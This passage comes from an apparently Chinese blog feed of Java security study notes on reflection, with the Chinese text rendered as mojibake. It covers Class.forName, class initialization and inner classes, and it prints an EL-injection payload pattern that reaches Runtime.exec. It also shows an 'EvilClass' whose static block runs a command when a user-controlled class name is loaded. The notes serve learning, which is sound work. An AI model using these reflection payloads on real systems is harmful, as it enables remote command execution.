<p>å¦‚æœä½ å·²ç»åŠ è½½äº†æŸä¸ªç±»,åªæ˜¯æƒ³è·å–å®ƒçš„<code>java.lang.Class</code>å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ‹¿å®ƒçš„<code>class</code>å±æ€§å³å¯ã€‚è¿™ä¸ªæ–¹æ³•å…¶å®å¹¶ä¸å±äºåå°„ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Test.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;Class Name: &quot;</span> + cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">// ç±»çš„å®šä¹‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816220429728.png" alt="image-20230816220429728" style="zoom:50%;">
</blockquote>
<h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><blockquote>
<p>å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å¾—åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ç”¨<code>forName</code>æ¥è¿›è¡Œè·å–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;MyClass&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(className);</span><br><span class="line">        System.out.println(<span class="string">&quot;Class Name: &quot;</span> + cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="comment">// ç±»çš„å®šä¹‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816220712735.png" alt="image-20230816220712735" style="zoom:50%;">
</blockquote>
<hr>
<h2 id="åå°„çš„ä½œç”¨"><a href="#åå°„çš„ä½œç”¨" class="headerlink" title="åå°„çš„ä½œç”¨"></a>åå°„çš„ä½œç”¨</h2><blockquote>
<p><code>getClass().forName(&quot;java.lang.Runtime&quot;)</code></p>
</blockquote>
<p>åœ¨å®‰å…¨ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„çš„ä¸€å¤§ç›®çš„ï¼Œå°±æ˜¯ç»•è¿‡æŸäº›æ²™ç›’ã€‚</p>
<p>æ¯”å¦‚ï¼Œä¸Šä¸‹æ–‡ä¸­å¦‚æœåªæ˜¯<code>Integer</code>ç±»å‹çš„æ•°å­—ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–åˆ°å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„<code>Runtime</code>ç±»å‘¢ï¼Ÿ</p>
<p>ä¹Ÿè®¸å¯ä»¥è¿™æ ·ï¼ˆä¼ªä»£ç ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™ä¸ªä»£ç çœ‹ä¸æ‡‚ï¼Œæ‰¾äº†å‡ ç¯‡æ–‡ç« ï¼Œä¸‹é¢æ˜¯ä¸ªäººç†è§£ï¼š</p>
<p>è¿™æ®µä»£ç æ˜¯éå¸¸å¸¸è§çš„payloadæ ¼å¼ï¼Œåœ¨å¾ˆå¤šæœåŠ¡å™¨æŠ¥è­¦å’ŒCVEä¸­å¸¸è§ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹åº”æ¼æ´åˆ†ææ–‡æ¡£</p>
<p><a href="http://exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf">http://exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf</a></p>
<p>å¸¸è§çš„æ ¼å¼åº”è¯¥æ˜¯è¿™ç§</p>
<p><code>*.getclass().forname(&quot;java.lang.Runtime&quot;).getRuntime().exec()</code></p>
<p>æ–‡æ¡£ä¸­å¯¹è¯¥<code>payload</code>è¿›è¡Œäº†å±•ç¤º(ç»å…¸è°ˆè®¡ç®—å™¨</p>
<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230817165815554.png" alt="image-20230817165815554" style="zoom: 50%;">

<p>å¯¹<code>Runtime</code>ç±»ï¼Œæ‰§è¡Œå‘½ä»¤çš„åŠŸèƒ½æ•ˆæœï¼Œå®ä¾‹ä»£ç æ‰§è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommandExecution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="comment">// ç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæˆ</span></span><br><span class="line">            process.waitFor();</span><br><span class="line">            <span class="comment">// è·å–å‘½ä»¤çš„é€€å‡ºå€¼</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">exitValue</span> <span class="operator">=</span> process.exitValue();</span><br><span class="line">            System.out.println(<span class="string">&quot;å‘½ä»¤æ‰§è¡Œå®Œæˆï¼Œé€€å‡ºå€¼ï¼š&quot;</span> + exitValue);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230821155641195.png" alt="image-20230821155641195" style="zoom:80%;">
</blockquote>
<h2 id="forNameé‡è½½-åŠ è½½-åˆå§‹åŒ–"><a href="#forNameé‡è½½-åŠ è½½-åˆå§‹åŒ–" class="headerlink" title="forNameé‡è½½&#x2F;åŠ è½½&#x2F;åˆå§‹åŒ–"></a>forNameé‡è½½&#x2F;åŠ è½½&#x2F;åˆå§‹åŒ–</h2><p>å¯ä»¥çœ‹çœ‹èœé¸Ÿæ•™ç¨‹æˆ–è€…å…¶ä»–æ–‡ç« </p>
<blockquote>
<p><a href="https://www.runoob.com/w3cnote/java-class-forname.html">Java class.forname è¯¦è§£ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p>
<p><a href="https://www.cnblogs.com/luoxn28/p/7100713.html">ã€Javaæ ¸å¿ƒæŠ€æœ¯ã€‘ç±»å‹ä¿¡æ¯(Classå¯¹è±¡ åå°„ åŠ¨æ€ä»£ç†) - luoxn28 - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/mocas_wang/article/details/107428506">Class.forName()ç”¨æ³•è¯¦è§£_mocas_wangçš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<p><code>forName</code>æœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š </p>
<blockquote>
<ul>
<li><code>Class&lt;?&gt; forName(String name)</code> </li>
<li><code>Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)</code></li>
</ul>
</blockquote>
<p>ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€å¸¸è§çš„è·å–<code>class</code>çš„æ–¹å¼ï¼Œå…¶å®å¯ä»¥ä¸ºç¬¬äºŒç§æ–¹å¼çš„ä¸€ä¸ªå°è£…</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// ç­‰äº</span></span><br><span class="line">Class.forName(className,<span class="literal">true</span>,currentLoader)</span><br></pre></td></tr></table></figure>

<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ</p>
<h3 id="forNameçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å"><a href="#forNameçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å" class="headerlink" title="forNameçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å"></a><code>forName</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å</h3><h3 id="forNameçš„ç¬¬äºŒå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–"><a href="#forNameçš„ç¬¬äºŒå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–" class="headerlink" title="forNameçš„ç¬¬äºŒå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–"></a><code>forName</code>çš„ç¬¬äºŒå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–</h3><p>ç¬¬äºŒä¸ªå‚æ•°<code>initialize</code>å¸¸å¸¸è¢«äººè¯¯è§£ï¼Œä½¿ç”¨åŠŸèƒ½â€.classâ€æ¥åˆ›å»ºClasså¯¹è±¡çš„å¼•ç”¨æ—¶</p>
<blockquote>
<p><code>.class</code>å’Œ<code>forName()</code>åœ¨Javaä¸­çš„åŒºåˆ«æ˜¯ï¼š</p>
<ul>
<li><code>.class</code>æ˜¯åœ¨ç¼–è¯‘æ—¶ç¡®å®šçš„ï¼Œä¸ä¼šè§¦å‘ç±»çš„åˆå§‹åŒ–ï¼Œåªæ˜¯è·å–ç±»çš„<code>Class</code>å¯¹è±¡</li>
<li><code>forName()</code>æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ç±»ï¼Œå¹¶ä¸”ä¼šè§¦å‘ç±»çš„åˆå§‹åŒ–ï¼Œé™¤éæŒ‡å®š<code>initialize</code>ä¸º<code>false</code></li>
</ul>
</blockquote>
<h3 id="p-s-åˆå§‹åŒ–ç±»å’Œåˆ›å»ºç±»å¯¹è±¡çš„åŒºåˆ«"><a href="#p-s-åˆå§‹åŒ–ç±»å’Œåˆ›å»ºç±»å¯¹è±¡çš„åŒºåˆ«" class="headerlink" title="p.s.åˆå§‹åŒ–ç±»å’Œåˆ›å»ºç±»å¯¹è±¡çš„åŒºåˆ«"></a>p.s.åˆå§‹åŒ–ç±»å’Œåˆ›å»ºç±»å¯¹è±¡çš„åŒºåˆ«</h3><blockquote>
<p>åˆå§‹åŒ–ç±»å’Œåˆ›å»ºç±»å¯¹è±¡çš„åŒºåˆ«æ˜¯ï¼š</p>
<ul>
<li>åˆå§‹åŒ–ç±»æ˜¯æŒ‡<code>åŠ è½½ç±»çš„å­—èŠ‚ç åˆ°å†…å­˜ä¸­</code>ï¼Œå¹¶æ‰§è¡Œç±»çš„<code>é™æ€å˜é‡</code>å’Œ<code>é™æ€ä»£ç å—</code>ã€‚åˆå§‹åŒ–ç±»<code>åªä¼šå‘ç”Ÿä¸€æ¬¡</code>ï¼Œä»…ä»…å½“ç±»è¢«é¦–æ¬¡ä½¿ç”¨æ—¶ã€‚</li>
<li>åˆ›å»ºç±»å¯¹è±¡æ˜¯æŒ‡ä½¿ç”¨ç±»çš„<code>æ„é€ æ–¹æ³•æ¥åˆ†é…å†…å­˜ç©ºé—´</code>ï¼Œå¹¶ç»™<code>å¯¹è±¡çš„å±æ€§èµ‹å€¼</code>ã€‚åˆ›å»ºç±»å¯¹è±¡<code>å¯ä»¥å‘ç”Ÿå¤šæ¬¡</code>ï¼Œæ¯æ¬¡éƒ½ä¼š<code>è¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡</code>ã€‚</li>
</ul>
</blockquote>
<p>æ‰€ä»¥ç¬¬äºŒå‚æ•°å³ä½¿ä¸º<code>initialize=true</code>ï¼Œè¿™é‡ŒæŒ‡çš„ä¹Ÿæ˜¯åˆå§‹åŒ–ç±»è€Œéåˆ›å»ºç±»å¯¹è±¡ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘æ„é€ å‡½æ•°</p>
<h4 id="forName"><a href="#forName" class="headerlink" title="forName()"></a><code>forName()</code></h4><blockquote>
<p>é€šè¿‡è¿™ä¸ªä¾‹å­ï¼Œ</p>
<p>å¯ä»¥çœ‹åˆ°åˆå§‹åŒ–çš„ä½œç”¨å’Œåˆ›å»ºç±»å¯¹è±¡ï¼Œ</p>
<blockquote>
<p>ç¬¬ä¸€æ¬¡<code>åˆå§‹åŒ–</code>æ—¶ï¼Œ<code>åŠ è½½</code><u><strong>é™æ€å˜é‡</strong></u>å’Œ<u><strong>é™æ€ä»£ç å—</strong></u>ï¼Œæ‰“å°æ•°æ®</p>
<figure class="highlight nim"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">block</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>ç¬¬äºŒæ¬¡<code>åˆå§‹åŒ–</code>æ—¶ï¼Œ<code>ä¸åŠ è½½</code><u><strong>é™æ€å˜é‡</strong></u>å’Œ<u><strong>é™æ€ä»£ç å—</strong></u>ï¼Œæ— ä»»ä½•æ‰“å°æ•°æ®</p>
</blockquote>
<blockquote>
<p>å½“<code>åˆ›å»ºç±»å¯¹è±¡</code>æ—¶ï¼ŒåŠ è½½ç±»ä¸­æ„é€ å‡½æ•°ï¼Œå¦‚æœå¤šæ¬¡åˆ›å»ºç±»å¯¹è±¡ï¼Œä¼šæ‰§è¡Œå¤šæ¬¡æ„é€ å‡½æ•°</p>
</blockquote>
</blockquote>
<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230821212351622.png" alt="image-20230821212351622" style="zoom: 200%;">

<h4 id="class"><a href="#class" class="headerlink" title=".class"></a><code>.class</code></h4><blockquote>
<p>å¯ä»¥çœ‹åˆ°.class<code>ä¸ä¼šè¿›è¡Œ</code>åˆå§‹åŒ–<code>é™æ€å˜é‡</code>å’Œ<code>é™æ€ä»£ç å—</code>ï¼Œä¹Ÿ<code>ä¸ä¼šåˆ›å»ºç±»å¯¹è±¡</code></p>
</blockquote>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230822092726107.png" alt="image-20230822092726107"></p>
<p>å¸¸è§æœ‰ä¸‰ç§åˆå§‹åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™ä¸‰ç§ä¸­ï¼Œ</p>
<p>æœ€å…ˆè°ƒç”¨çš„æ˜¯<code>static&#123;&#125;</code></p>
<p>ç„¶åæ˜¯å•ä¸ªä¸­<code>&#123;&#125;</code></p>
<p>æœ€åæ˜¯<code>æ„é€ å‡½æ•°</code></p>
</blockquote>
<p>è¿è¡Œä¾¿å¯çŸ¥ï¼Œ</p>
<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230822212911537.png" alt="image-20230822212911537" style="zoom:200%;">

<blockquote>
<p>å› ä¸º<code>static&#123;&#125;</code>æ˜¯ç±»åˆå§‹åŒ–æ—¶è°ƒç”¨çš„ï¼Œè€Œ<code>&#123;&#125;</code>ä¸­ä»£ç æ˜¯æ”¾åœ¨<strong>æ„é€ å‡½æ•°super()åé¢</strong>ï¼Œä¹Ÿå°±æ˜¯<code>æ„é€ å‡½æ•°</code>çš„å‰é¢</p>
</blockquote>
<p>&#x3D;&#x3D;&gt;</p>
<blockquote>
<p><code>forName</code>ä¸­<code>initialize=true</code>å…¶å®å°±æ˜¯å‘Šè¯‰Javaè™šæ‹Ÿæœº<code>æ˜¯å¦æ‰§è¡Œç±»åˆå§‹åŒ–</code></p>
</blockquote>
<h5 id="æ¶æ„è°ƒç”¨"><a href="#æ¶æ„è°ƒç”¨" class="headerlink" title="æ¶æ„è°ƒç”¨"></a>æ¶æ„è°ƒç”¨</h5><p>å‡å¦‚æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡½æ•°ï¼Œå…¶ä¸­å‡½æ•°çš„å‚æ•°nameå¯æ§ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å†æ„é€ ä¸€ä¸ªæ¶æ„ç±»ï¼Œå°†æ¶æ„çš„ä»£ç æ”¾ç½®åœ¨<code>static&#123;&#125;</code>ä¸­ï¼Œä»è€Œæ‰§è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œè¿™ä¸ªæ¶æ„ç±»å¦‚ä½•å¸¦å…¥ç›®æ ‡æœºå™¨ä¸­ï¼Œå¯èƒ½å°±æ¶‰åŠåˆ°<code>ClassLoader</code>çš„ä¸€äº›åˆ©ç”¨æ–¹æ³•</p>
<p>åé¢å­¦åˆ°ä¼šè¡¥å……è¿™é‡Œå®ç°ä¼ å…¥çš„è¿‡ç¨‹</p>
<h3 id="forNameçš„ç¬¬ä¸‰ä¸ªå‚æ•°ClassLoader"><a href="#forNameçš„ç¬¬ä¸‰ä¸ªå‚æ•°ClassLoader" class="headerlink" title="forNameçš„ç¬¬ä¸‰ä¸ªå‚æ•°ClassLoader"></a><code>forName</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•°<code>ClassLoader</code></h3><blockquote>
<p><code>ClassLoader</code>æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>å®ƒå°±æ˜¯ä¸€ä¸ªâ€åŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚</p>
</blockquote>
<p>Javaä¸­é»˜è®¤çš„<code>ClassLoader</code>å°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»çš„å®Œæ•´è·¯å¾„ï¼Œå¦‚<code>java.lang.Runtime</code>ã€‚</p>
<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>Javaæ¼«è°ˆå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaå®‰å…¨[åå°„(2)]</title>
    <url>//post/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/</url>
    <content><![CDATA[<blockquote>
<p>å¦‚ä½•åˆ©ç”¨Runtimeæ„é€ payload</p>
</blockquote>
<span id="more"></span>

<h1 id="Javaå®‰å…¨-åå°„-2"><a href="#Javaå®‰å…¨-åå°„-2" class="headerlink" title="Javaå®‰å…¨[åå°„(2)]"></a>Javaå®‰å…¨[åå°„(2)]</h1><p>ç¬¬ä¸€ç¯‡è®²åˆ°è¿‡ï¼Œå¦‚æœæƒ³è¦åŠ è½½ä¸€ä¸ªç±»ï¼Œå¯ä»¥åŒ<code>forName</code>è¿›è¡ŒåŠ è½½ï¼Œä½†æ˜¯æ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬ä¸€èˆ¬ç”¨åˆ°çš„æ˜¯<code>import</code>ï¼Œæ‰€ä»¥<code>forName</code>å°±å¯ä»¥å¸®åŠ©æ”»å‡»è€…åŠ è½½ä»»æ„ç±»ã€‚</p>
<h2 id="å†…éƒ¨ç±»"><a href="#å†…éƒ¨ç±»" class="headerlink" title="å†…éƒ¨ç±»"></a>å†…éƒ¨ç±»</h2><p>å¯¹äº<code>$</code>ï¼Œåœ¨å¾ˆå¤šæºç é‡Œçœ‹åˆ°ï¼Œç±»ååŒ…å«<code>$</code>ç¬¦å·ï¼Œæ¯”å¦‚åœ¨<code>fastjion</code>åœ¨<code>checkAutoType</code>æ—¶å€™å°±ä¼šå…ˆå°† <code>$</code>æ›¿æ¢ä¸º<code>.</code></p>
<blockquote>
<p><a href="https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038">https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038</a></p>
</blockquote>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907120021390.png" alt="image-20230907120021390"></p>
<p>å¯ä»¥çœ‹åˆ°ç±»åçš„<code>$</code>è¢«æ›¿æ¢ä¸º<code>.</code>æ¥è§£æï¼Œæ‰€ä»¥<code>$</code>èµ·çš„ä½œç”¨å®é™…å°±æ˜¯æŸ¥æ‰¾å†…éƒ¨ç±»ã€‚</p>
<p>å†™ä¸ªä¾‹å­ï¼Œåœ¨ä¸€ä¸ªæ™®é€šç±»<code>My</code>ä¸­ï¼Œå†™ä¸€ä¸ªå†…éƒ¨ç±»<code>Your</code>ï¼Œç„¶åç¼–è¯‘çœ‹çœ‹<code>output</code>æ–‡ä»¶å¤¹ä¼šç”Ÿæˆä»€ä¹ˆ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsideClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">My</span>&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Your</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907122251594.png" alt="image-20230907122251594"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>Your</code>ç±»å¯¹åº”ç”Ÿæˆäº†ä¸€ä¸ª<code>My$Your.class</code>ï¼Œ<code>My</code>ç±»å¯¹åº”ç”Ÿæˆäº†ä¸€ä¸ª<code>My.class</code>ã€‚</p>
<p>æˆ‘ä»¬è¿˜å¯ä»¥è¯•è¯•åŠ è½½è¿™ä¸¤ä¸ªï¼Œçœ‹çœ‹æ˜¯å¦æœ‰åŒºåˆ«</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsideClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; c1 = Class.forName(<span class="string">&quot;reflect2.My$Your&quot;</span>);</span><br><span class="line">        System.out.println(c1.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">My</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Myç±»è¢«åŠ è½½&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Your</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Yourç±»è¢«åŠ è½½&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907124919435.png" alt="image-20230907124919435"></p>
<p>å‘ç°åˆå§‹åŒ–å†…éƒ¨ç±»æ—¶ï¼Œå¤–éƒ¨ç±»å¹¶æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œæ‰€ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥å°†å®ƒä»¬å½“ä½œä¸¤ä¸ªæ— å…³ç±»ã€‚</p>
<p>æ ¹æ®ä¸Šé¢æ‰€è¯´ï¼ŒJavaä¼šå°†<code>$</code>å½“ä½œ <code>.</code> ï¼Œé‚£å¦‚æœç›´æ¥æŠŠ<code>$</code>æ¢æˆ <code>.</code> çš„è¯ä¼šæ€ä¹ˆæ ·</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907130041368.png" alt="image-20230907130041368"></p>
<p>å‘ç°è¿è¡ŒæŠ¥é”™ï¼ŒåŸå› æ˜¯Javaç¼–è¯‘å™¨æœ‰è‡ªå·±çš„è§„åˆ™ï¼Œ<code>$</code>åœ¨å®ƒçš„è§„åˆ™ä¸­æ˜¯å¤–éƒ¨ç±»å’Œå†…éƒ¨ç±»çš„åˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¦‚æœç”¨ <code>.</code>æ¥åˆ†å‰²å¤–éƒ¨ç±»å’Œå†…éƒ¨ç±»å°±ä¼šè®©å…¶åˆ†ä¸æ¸…æ„å›¾ï¼Œä»è€ŒæŠ¥é”™ï¼Œè™½ç„¶å…¶å†…éƒ¨ä¼šå°†å…¶å½“ä½œ <code>.</code> ï¼Œä½†æ˜¯å‰æè¿˜æ˜¯<code>$</code>è¢«å½“ä½œå†…å¤–éƒ¨ç±»åˆ†å‰²ç¬¦åå¤„ç†ã€‚</p>
<h2 id="getRuntime"><a href="#getRuntime" class="headerlink" title="getRuntime"></a>getRuntime</h2><p><code>class.newInstrance()</code> ä½œç”¨æ˜¯è°ƒç”¨è¿™ä¸ªç±»ä¸­çš„æ— å‚æ„é€ å‡½æ•°ï¼Œä½†æ˜¯ç»å¸¸ç›´æ¥åœ¨<code>payload</code>ä¸­è°ƒç”¨<code>newIntstrance</code>æ—¶å¾€å¾€ä¼šæŠ¥é”™ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªåŸå› </p>
<blockquote>
<ol>
<li>ç›®æ ‡ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°</li>
<li>ç›®æ ‡ç±»çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„</li>
</ol>
</blockquote>
<p>æœ€å¸¸é‡åˆ°çš„æƒ…å†µä¸‹æ˜¯ï¼Œè°ƒç”¨<code>java.lang.Runtime</code>ï¼Œ</p>
